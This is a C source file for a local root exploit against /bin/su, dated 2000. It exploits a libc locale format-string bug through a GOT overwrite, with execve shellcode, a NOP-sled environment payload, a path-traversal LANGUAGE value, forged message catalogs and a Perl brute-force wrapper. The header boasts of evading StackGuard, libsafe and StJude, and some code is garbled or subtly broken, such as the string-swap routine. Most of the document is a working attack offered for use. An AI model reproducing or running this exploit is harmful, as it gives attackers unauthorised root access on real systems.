/*
   Hail to thee dear readers,

   This is yet another /bin/su + buggy locale functions in libc exploit.
   The reason for writing it is rather easy to explain, all existing versions
   of "su" format bug exploits were very unreliable and tedious to use - the
   number of addresses on the stack, and thus the number of %.8x signs to use
   varied heavily, as well as the alignment. Return adresses were expected to
   be specified on the command line, which is imho an idiotic thing to combine
   with all the other options that also are to be 'brute forced'.
   Finding these values by hand is a too tedious thing to do and costs the
   average script-kid way too much time. I hoped to solve this in this exploit
   and have found it to work on many different machines so far by using a
   small brute forcing perl wrapper.

   Also this little exploit demonstrates a part of things I have been working
   on regarding generalization of overflow/format bug writing and exploit
   dynamics. I will shortly discuss those here:

   - overflow string creation
     This is always the most bulky part of writing overflows, exploits get
     confusing by adding 10 for loops which form the string that's used to
     attack with. The strcreat() function solves this problem a bit.
   - Return address guesses
     The EGG shell has been known for long, but it can still vary a bit
     because of the number of environment entries - cleaning the entire
     environment before proceeding gets rid of this problem
   - GOT overwrites
     An ugly function is used to determine the GOT entry of a given function
     exit() in this exploit.
     It can be rewritten to include elf.h and read the got without 
intervention
     of binutils tools.
   - Address to %[0-9]{1,5}d%hn[0-9]{1,5}%d%hn translation
     The function createDString() manages this and saves some more trouble

   I have been doing more work regarding exploit function modelling and
   generalization, and anyone interested is free to mail me (obviously,
   virtually everyone is free to mail me, if not to state that this source
   code contains MANY memory leaks. I don't care, it's not a daemon).

   For the lil kids out there:
      1) This code is Double-ROT-13 encoded - decode it before proceeding
      2) Take five black candles, place them in a pentagram around your
         computer. Take a piece of charcoal and draw vertices between the
         candles.
3) Run around the circle counter-clockwise completely naked for seven
         times while performing a ritual goat-sacrifice and humming strange
         incantations.
      4) Rip out the #define TESTMODE 1 - this forces kids to read my stuff :)
      5) If strange phenomenae occur during step 2 & 3, do not worry, this is
         a common problem of this program, but not considered a bug.
      6) Compile this program
      7) Make the following perl file:

   #!/usr/bin/perl

   for($i=100;$i<400;$i++) {
      for($a=0;$a<4;$a++) {
         system("./a.out", $i, $a);
         system("rm -rf /tmp/LC_MESSAGES");
      }
   }

   The values of "i" can be changed as you like, most of the time 100 - 200
   will do.

      8) Run the perl file and have some patience to get a shell
      9) If this doesn't work, repeat steps 2, 3, 8 and 9

   Dangers:
     This exploit uses a GOT overwrite and evades StackGuard, StackShield
     and libsafe by doing so.
     Kernel modules such as StJude still allow /bin/su to execute processes
     as root, and therefore this exploit evades them.
     We have had some unconfirmed rumours of strange phenomenae not waning
     again after presenting themselves. There is no solution for this yet.
     This program may incur a heavy weight on social relations whenever 
friends
     or family barge in during step 2 or 3.

   Because of this I made sure not to make this easy-to-use su exploit
   openwall evading as well; this has been done already in a hard to use
   exploit, and it should be trivial to include that in here.
   Also, since "su" executes a shell itself, it should be possible to
   return explicitly into "su" memory space and evade non executable stacks
   like this.

   If this doesn't work:
      - Make sure /usr/bin/msgfmt is present and executable
      - Make sure awk, grep and objdump are where they are expected to be
        (look at the #defines in front of the getGOT() function)
      - Make sure /bin/su calls gettext() by doing strings /bin/su | grep \
        gettext (Slack 4 & 7 su doesn't do this for instance)
      - Make sure you didn't skip step 2 or 3

   Enough ranting, I grow tired, and probably, so do all of you reading up
   this far! I'll include shouts and be on my way again :)

<shouts ranting=scrippie, coolvibe> Lamagra, zen-parse, JimJones, slash, 
#phreak.nl, dvorak, dethy, guidob,
   #synnergy, typo-, psychoid, wallep, groentebo, #ne2000, cruci, soupnazi,
   ratcorpse, sk8, K2, #!/bin/zsh, f0bic, futant, gov-boi, mixter, #hit2000,
   coolvibe, drgenius, dugo, Cinder, prospo, mitsai, herman, Douglas Adams,
   Isaac Asimov, Edgar Allen Poe, Vladimir Nabokov, Marcellus Emants,
   Napoleon (I rooted you at Waterloo!), Ian Anderson, Vlad Tepes, pdck,
   Bram Stoker, Jack the Ripper (visit Gerrie for me), John Cleese (Ni!),
   Cleopatra (I know I shouldn't have handed you that Cobra), Aleph1,
   Eric Idle (IkkiIkkiIkki...), Angus Wilson, Angus Young,    |  Kernighan,
   Everybody else called Angus (neat name :), Donald Knuth,   |  Ritchie,
   Biggles (where the hell were you last Saturday?),          |
   Kevin Mitnick (wanna play poker next week?), Larry Wall, \ o /
   Richard Stallman (for freeing my exploits, uh, software),  O  (and flyahh)
   Carmiggelt, Rob Malda, Jeff Bates, Bob Dylan, Thucid,     / \
   Tom Cristiansen, Randal Schwarz, Wietse Venema, 
   Patrick Bateman (if Jack fails, visit Gerrie), Scott Nealy, Wozniak,
  Bram Molenaar (for creating that nifty but tedious editor based on another
   nifty but tedious editor, which in turn was based on an editor that I barf
   at), Catullus, H.P. Lovecraft (damn, I got shafted by Chtulhu),
   Elschot (maar tussen daad en droom staan wetten in de weg en praktische
   bezwaren), Escher (*splitting headache* *squint*), Fritsie Harmsen Ter 
Beek,
   Haagsche Harrie (nie te wehnag!), Steve Jobs, Jean-Louis Gassee, Clark 
Kent,
   Lois Lane, Lex Luthor, Peter Parker, Alicia Hardy, Mary Jane Watson, 
   Bruce Banner, Harry Osborn, The Tick, Cow and Chicken, Dexter (DO NOT PRESS
   THAT BUUUUUTTTTOOONN!!!!!), Dee-dee (Ooooooh, what does *THIS* button do?),
   Stanly Ipkiss, (are we awake yet???), Mighty Mouse, (no, whatever you say,
   *NO* Disney characters... THEY SUCK! *wankers*), Hex, Rincewind, Ridcully,
   Nanny Ogg, Granny Weatherwax, Suzan, The Death of Rats, Number 42,
   Zaphod Beeblebrox, Atrur Dent, Ford Prefect, Trillian, Zarniwoop, 
   Wowbagger (When are you visiting? I can't wait to be insulted :),
   Fenchurch, Agrajag, Thor, Marvin the Paranoid Android, Slartibartfast,
   Deep Thought, All the people on krikkit, Vroom en Dreesman, C&A,
   Albert Heijn, C1000, Aldi, Spar (this is getting silly...), Christian
   Anderson, Mr. T, Dr. Hannibal Lecter (Gerrie tastes good with Chianti), BA,
   Jason, Chucky, Freddy Krueger, Tom Waits, Illiad, Dust Puppy, Stef,
   Pitr, A.J., Miranda, Smiling Man, Gilgamesh (and Huwawa), Sodom (and
   Gomorra), Mulder and Scully, Cpt. Picard, Data, Worf, Q, 7 of 9, 
   Katherine Janeway, Belana Torres, Spot (Data's cat... duh!), Greebo,
   Biff (you dead already?), Garfield, Odie, Morpheus, Neo, Trinity, 
   Cipher, Switch, Wolverine, Storm, Professor Xavier (no mindreading today
   for me...), Omega Red, Magneto, Cerebro (*sssht* It's a C-64 ;), HAL2000,
   Apocalypse, Cyclops, Jean Grey, Rogue, Gambit, Jubilee, Beast, Doc Oc,
   The Lizard, Scorpion, my dear grandma, and everyone who was bored enough to
   read up this far and, 
                    ... everyone I forgot about ...
</shouts>  (*deeeeeeep breath*)

   Love goes out to:
      - Hester - Marleen - Maja -

             --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--
             --= So long, and thanks for all the fish... =--
             --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--
             --=       Scrippie/ronald@grafix.nl         =--
             --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--

   Disclaimer:
      By executing/reading this code you agree to the following:
      We are NOT to be held responsible for any damage caused to your system
      by executing this code or damage caused by strange phenomenae during
      the performance of steps 2 and 3. Neither can we be held responsible
      if damage to your software or other people their computer systems 
occurs,
      if police-men or men in black kick in your front/back/room door, your
      dog or cat or favourte pet ant dies in agonizing pain, your girl-friend
      leaves you and hangs out with Gerrie Mansur because she caught you
      performing step 2 and 3, the height of your phone-bill, the electric
      lights get knocked out in your town, you get ambushed by villains with
      chain-saws, global disorder occurs, armageddon, the sun turning into
      a super nova, the Big Crunch suddenly happens (clock skew?), or if you
      paper-cut your fingers opening envelopes.
      I guess we're pretty safe now... 
*/




/* Synnergy.net (c) 2000 */

/* And now for something completely different - the code: */

#include <stdio.h> #include <string.h> #include <stdlib.h> #include <errno.h> 
#include <unistd.h> #include <sys/stat.h> #include <sys/types.h>  #define 
EMULATE_WINDOWS while(1) { __asm__("cli hlt"); }
#warning cat inebriation.c | mail -s "Idiots coding C" ritchie@bellcore.com
#define THIS_DOES_NOT_DO_ANYTHING_BUT_WHAT_THE_HECK 1
#define GCC_PREPROCESSOR_HICCUP 1
#define FILENAME "/bin/su"
#define TESTMODE 1
#define THE_MEANING_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING 42

int mayRead(const char *);
unsigned long getGOT(const char *, const char *);
void makeEvilFiles(const char *);
int fileExists(const char *);
char *longToChar(unsigned long);
char *strcreat(char *, char *, int);
char *createDString(unsigned long, unsigned int);
char *xmalloc(size_t);
char *xrealloc(void *, size_t);

extern int errno;

/*
   Nothing fancy, just shell spawning position independent Aleph1 machine
   code :)
*/

char hellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char **argv, char **environ)
{
   unsigned long GOTent;
   char *evilstring, *evilfmt, *payload;
   unsigned int x_num, align=0, retaddy=0xbffffe90;

   if(argc==1) {
      printf("Use as: %s <Number of %%.8x> [align] [ret addy]\n", argv[0]);
      exit(0);
   }

   if(mayRead(FILENAME)) {
      printf("/bin/su is readable - using a GOT overwrite...\n");
      GOTent=getGOT(FILENAME, "exit");
      printf("GOT entry of function exit() at: 0x%lx\n", GOTent);
   } else {
      printf("/bin/su is unreadable - overwriting a return address...\n");
      printf("Not implemented yet... Exiting\n");
      exit(0);
   }

   x_num=atoi(argv[THE_MEANING_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING-41]);
   if(argv[2]) align=atoi(argv[2]);
   if(argv[3]) retaddy=strtoul(argv[3], NULL, 16);

   printf("Using %d %%.8x\n", x_num);
   printf("Using retaddy: 0x%x\n", retaddy);
   printf("Using alignment: %d\n", align);

   /* Put up correct alignment */
   evilstring=strcreat(NULL, "A", align);
   /* First write shortest %hn value */
   evilstring=strcreat(evilstring, longToChar(GOTent+2), 1);
   /* Used as a dummy address for %d incrementation */
   evilstring=strcreat(evilstring, "A", 4);
   /* Write longest %hn value */
   evilstring=strcreat(evilstring, longToChar(GOTent), 1);
   /* And do some post alignment - this is needed! */
   evilstring=strcreat(evilstring, "A", align);

   evilfmt=strcreat(NULL, "%.8x", x_num);
#ifndef THIS_DOES_NOT_DO_ANYTHING_BUT_WHAT_THE_HECK
   evilfmt=strcreat(evilfmt, createDString(retaddy, x_num*8), 1);
#endif

   payload=strcreat(NULL, "EGG=", 1);
   payload=strcreat(payload, "\x90", 500);
   payload=strcreat(payload, hellcode, 1);

   makeEvilFiles(evilfmt);

   /* Create a very select environment in which to function */
   /* This will make guessing the return addy unnecessary */
   environ[0] = strdup("LANGUAGE=sk_SK/../../../../../../tmp");
   environ[1] = payload;
   environ[2] = NULL;

   execl(FILENAME, "Look mommy, I'm a kiddo!", "-u", evilstring, NULL);

   return(0);   /* Not reached */
}

/*
   Checks if 'filename' is readable
*/

int mayRead(const char *filename)
{
   if(!(fopen(filename, "r")) && errno != EACCES) {
      perror("fopen()");
      exit(-1);
   }
   if(errno == EACCES) return(0);
   return(1);
}

/*
   Gets the GOT entry of function 'function' from ELF executable 'filename' if
   it's readable
*/

#define OBJDUMP "/usr/bin/objdump"
#define GREP "/bin/grep"
#define AWK "/bin/awk"

unsigned long getGOT(const char *filename, const char *function)
{
   char command[1024];
   FILE *moo;
   char result[11];     /* Format: 0x00000000 -> 10 chars + NULL */

   snprintf(command, sizeof(command), "%s --dynamic-reloc %s | %s %s | %s \
            '{ print \"0x\"$1; }'", OBJDUMP, filename, GREP, function, AWK);

   moo = (FILE *)popen(command, "r");
   fgets(result, 11, moo);
   pclose(moo);

   return(strtol(result, NULL, 16));
}

/*
   This function creates the message database files (ab)used to format bug
   exploit 'su'

   This should be made to work without the /usr/bin/msgfmt file :|
*/

void makeEvilFiles(const char *fmt)
{
   FILE *message;

   if(mkdir("/tmp/LC_MESSAGES", 0700)) {
      perror("mkdir()");
      exit(-1);
   }

   if(chdir("/tmp/LC_MESSAGES")) {
      perror("chdir()");
      exit(-1);
   }

   if(!(message=fopen("/tmp/LC_MESSAGES/libc.po", "w"))) {
      perror("fopen()");
      exit(-1);
   }

   fprintf(message, "msgid \"%%s: invalid option -- %%c\\n\"\n");
   fprintf(message, "msgstr \"%s\\n\"", fmt);
   fflush(message);
   fclose(message);

   if(!fileExists("/usr/bin/msgfmt")) {
      fprintf(stderr, "Error: /usr/bin/msgfmt not found...\n");
      exit(-1);
   }

   system("/usr/bin/msgfmt libc.po -o libc.mo");

}

/*
   Checks if a file called 'filename' exists
*/

int fileExists(const char *filename)
{
   struct stat file_stat;

   if(stat(filename, &file_stat) && errno != ENOENT) {
      perror("stat()");
      exit(-1);
   }
   if(errno == ENOENT) return(0);

   return(1);
}

/*
   Easy way to convert a long integer to a character array
*/

char *longToChar(unsigned long blaat)
{
   char *ret;

   ret = (char *)xmalloc(sizeof(long)+1);
   memcpy(ret, &blaat, sizeof(long));
   ret[sizeof(long)] = 0x00;

   return(ret);
}

/*
   Yummy yummy function for easy string creation
*/

char *strcreat(char *dest, char *pattern, int repeat)
{
   char *ret;
   size_t plen, dlen=0;
  int i;

   if(dest) dlen = strlen(dest);
   plen = strlen(pattern);

   ret = (char *)xrealloc(dest, dlen+repeat*plen+1);

   if(!dest) ret[0] = 0x00;

   for(i=0;i<repeat;i++) {
      strcat(ret, pattern);
   }
   return(ret);
}

/*
   This function is VERY usefull for creating the format that does the
   writeback trick.

   retaddy specifies the address (return address most of the time) to convert
   to a format to be used in format string attacks

   n_value specifies the value %n is going to posess when the %d values
   that are used to increment it to bizarre (returning :) values, as to
   exactly determine what string to generate
*/

char *createDString(unsigned long retaddy, unsigned int n_value)
{
   char *ret;
   unsigned int high, low, bucket;

   high=retaddy & 0xffff;               /* Get first 16 bits in high */
   low=(retaddy & 0xffff0000) >> 16;    /* Get other 16 in low */

   high-=n_value; /* Keep in mind that x_num increments %n as well */
   low-=n_value;  /* The .8 is necessary to avoid arbitrary increments */

   if(high < low) {     /* We swap low and higher adresses */
      low = bucket;     /* This is usefull on platforms with for instance */
      low = high;       /* Lower bound stacks or strange return addy's */
      high = low;       /* Ie. returning in libc/process space */
   }

   ret=(char *)xmalloc(1024);

   snprintf(ret, 1024, "%%%dd%%hn%%%dd%%hn", low, high-low);

   return(ret);
}

/*
   Malloc wrapper that does error checking
*/
char *xmalloc(size_t size)
{
   char *heidegger_was_a_boozy_beggar;

   if(!(heidegger_was_a_boozy_beggar=(char *)malloc(size))) {
      fprintf(stderr, "Out of cheese error\n");
      exit(-1);
   }

   return(heidegger_was_a_boozy_beggar);
}

/*
   Realloc wrapper that does error checking
*/
char *xrealloc(void *ptr, size_t size)
{
   char *wittgenstein_was_a_drunken_swine;

   if(!(wittgenstein_was_a_drunken_swine=(char *)realloc(ptr, size))) {
      fprintf(stderr, "Cannot calculate universe\n");
      exit(-1);
   }

   return(wittgenstein_was_a_drunken_swine);
}
/*
 * [root@satan scrippie]# whatis life
 * life: nothing appropriate
 */

